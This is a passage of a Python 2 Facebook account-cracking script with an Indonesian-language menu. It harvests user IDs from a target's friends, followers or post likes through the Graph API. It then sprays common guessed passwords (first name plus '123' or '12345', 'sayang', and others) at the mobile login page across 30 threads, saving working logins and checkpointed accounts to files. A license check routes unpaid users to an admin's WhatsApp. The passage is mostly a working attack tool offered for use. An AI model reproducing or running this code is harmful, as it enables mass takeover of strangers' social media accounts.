        if j in r:
            os.system('clear')
            print logo
            print 50 * '\x1b[1;97m-'
            print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Login Status\x1b[1;91m :\x1b[1;92m Complete'
            time.sleep(1)
        else:
            os.system('clear')
            print logo
            print 50 * '\x1b[1;97m-'
            print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Login Status : \x1b[1;91mFailed\x1b[1;39m'
            print '\x1b[1;97m[\x1b[1;94m\xe2\x80\xa2\x1b[1;97m] ID Not Confirmed\x1b[1;39m'
            print '\x1b[1;97m[\x1b[1;94m\xe2\x80\xa2\x1b[1;97m] Please Chat Admin For Confirmed Your ID\x1b[1;39m'
            raw_input('\x1b[1;97m[\x1b[1;94m>\x1b[1;97m] Press Enter To Chat Admin\x1b[1;39m')
            os.system('am start https://wa.me/6285946352369text=saya+ingin+upgrade+ke+premium+ini+id+saya%20ID:%20' + j + ' >/dev/null')
            os.sys.exit()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] No Connection'
        raw_input('\x1b[1;97m[\x1b[1;92m>\x1b[1;97m] Back')
        spt()
    except KeyboardInterrupt:
        os.sys.exit()
    except IOError:
        subprocess.Popen(['rm', '-rf', 'licensed.log'])
        user()
        
        

def menutouch():
	print logo
	print " [ Selamat Datang \033[0;93m"+nama+"\033[0;97m ]\n"
	print " [1] Crack Dari Publik Teman"
	print " [2] Crack Dari Total Followers"
	print " [3] Crack Dari Like Postingan"
	print " [0] Logout"
	pilih_menutouch()

def pilih_menutouch():
	ask = raw_input("\n Choose >> ")
	if ask == "":
		print " [!] Pilih Yang Bener !"
		exit()
	elif ask == "1" or ask == "01":
		print "\n [*] Isi 'me' Jika Ingin Crack Dari List Teman"
		idt = raw_input(" [+] ID Publik : ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			print " [+] Nama : "+sp["name"]
		except KeyError:
			print " [!] ID Tidak Tersedia"
			exit()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "2" or ask == "02":
		print "\n [*] Isi 'me' Jika Ingin Crack Follower Sendiri"
		idt = raw_input(" [+] ID Publik : ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			print " [+] Nama : "+sp["name"]
		except KeyError:
			print " [!] ID Tidak Tersedia"
			exit()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "3" or ask == "03":
		print "\n [*] Masukan ID Postingan Nya Ajah"
		idt = raw_input(" [+] ID Post : ")
		r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token)
		z = json.loads(r.text)
		for i in z['data']:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "0" or ask == "00":
		os.system("rm -f login.txt") 
		print " [!] Berhasil Menghapus Token"
		exit()
	else:
		print " [!] Pilih Yang Bener !"
		exit()
	print " [*] Total ID : "+str(len(id))
	print " [+] File \033[0;92mOK\033[0;97m Tersimpan Di : out/ok.txt"
	print " [+] File \033[0;93mCP\033[0;97m Tersimpan Di : out/cp.txt"
	print " [!] Sedang Prosess Crack\n"
		
	def main(arg):
		global ok,cp
		user = arg
		uid,name=user.split("|") ##Gk Usah Di Ganti Ajg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			pass1 = name.lower()+'123'
			rex = requests.post('https://touch.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'}, headers={'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'})
			xo = rex.url
			if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
				print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass1
				ok.append(uid+' | '+pass1)
				save = open('out/ok.txt','a') 
				save.write(str(uid)+' | '+str(pass1)+'\n')
				save.close()
			elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
				print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass1
				cp.append(uid+' | '+pass1)
				save = open('out/cp.txt','a') 
				save.write(str(uid)+' | '+str(pass1)+'\n')
				save.close()
			else:
				pass2 = name.lower()+'12345'
				rex = requests.post('https://touch.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'}, headers={'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'})
				xo = rex.url
				if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
					print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass2
					ok.append(uid+' | '+pass2)
					save = open('out/ok.txt','a') 
					save.write(str(uid)+' | '+str(pass2)+'\n')
					save.close()
				elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
					print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass2
					cp.append(uid+' | '+pass2)
					save = open('out/cp.txt','a') 
					save.write(str(uid)+' | '+str(pass2)+'\n')
					save.close()
				else:
					pass3 = 'sayang'
					rex = requests.post('https://touch.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'}, headers={'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'})
					xo = rex.url
					if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
						print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass3
						ok.append(uid+' | '+pass3)
						save = open('out/ok.txt','a') 
						save.write(str(uid)+' | '+str(pass3)+'\n')
						save.close()
					elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
						print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass3
						cp.append(uid+' | '+pass3)
						save = open('out/cp.txt','a') 
						save.write(str(uid)+' | '+str(pass3)+'\n')
						save.close()
					else:
						pass4 = 'anjing'
						rex = requests.post('https://touch.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'}, headers={'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'})
						xo = rex.url
						if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
							print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass4
							ok.append(uid+' | '+pass4)
							save = open('out/ok.txt','a') 
							save.write(str(uid)+' | '+str(pass4)+'\n')
							save.close()
						elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
							print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass4
							cp.append(uid+' | '+pass4)
							save = open('out/cp.txt','a') 
							save.write(str(uid)+' | '+str(pass4)+'\n')
							save.close()
						else:
							pass5 = 'bangsat'
							rex = requests.post('https://touch.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'}, headers={'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'})
							xo = rex.url
							if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
								print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass5
								ok.append(uid+' | '+pass5)
								save = open('out/ok.txt','a') 
								save.write(str(uid)+' | '+str(pass5)+'\n')
								save.close()
							elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
								print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass5
								cp.append(uid+' | '+pass5)
								save = open('out/cp.txt','a') 
								save.write(str(uid)+' | '+str(pass5)+'\n')
								save.close()
				
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print "\n [+] Finished"
	print " [*] Total \033[0;92mOK\033[0;97m : "+str(len(ok))
	print " [*] Total \033[0;93mCP\033[0;97m : "+str(len(cp))
	exit()

if __name__ == '__main__':
	spt()
	menu()

